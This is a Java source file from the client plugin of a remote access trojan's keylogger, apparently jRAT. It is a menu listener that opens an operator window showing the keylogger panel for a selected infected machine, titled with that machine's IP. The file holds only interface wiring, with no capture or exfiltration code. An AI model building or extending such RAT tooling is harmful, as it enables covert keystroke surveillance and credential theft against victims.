package jrat.plugin.keylogger.client;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.List;

import javax.swing.JFrame;

import jrat.api.Client;
import jrat.api.Icons;
import jrat.api.ui.BaseControlPanel;
import jrat.api.ui.RATMenuItemActionListener;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<Client> clients) {
		try {
			if (clients.size() > 0) {
				final Client client = clients.get(0);
				BaseControlPanel panel = KeyloggerPlugin.entry.get(client);

				if (panel == null) {
					panel = KeyloggerPlugin.entry.newPanelInstance(client);
					KeyloggerPlugin.entry.put(client, panel);
				}
				
				final BaseControlPanel finalPanel = panel;

				JFrame frame = new JFrame();
				frame.addWindowListener(new WindowAdapter() {
					@Override
					public void windowClosing(WindowEvent arg0) {
						finalPanel.onClose();
						KeyloggerPlugin.entry.remove(client);
					}
				});
				frame.setTitle("Keylogger - " + client.getIP());
				frame.setSize(750, 400);
				frame.setLocationRelativeTo(null);
				frame.setIconImage(Icons.getIcon("Keylogger", "/icons/keyboard.png").getImage());
				frame.setLocationRelativeTo(null);
				frame.add(panel);
				frame.setVisible(true);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
